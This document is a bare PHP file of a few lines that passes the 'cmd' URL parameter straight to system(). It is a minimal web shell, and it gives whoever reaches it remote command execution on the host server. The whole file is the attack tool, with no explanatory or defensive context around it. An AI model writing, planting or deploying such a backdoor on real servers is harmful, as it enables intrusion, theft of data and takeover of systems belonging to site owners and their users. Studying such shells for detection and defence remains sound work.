<?php
if ($_GET['cmd'] == "") {
	exit();
}
system($_GET['cmd']);
?>
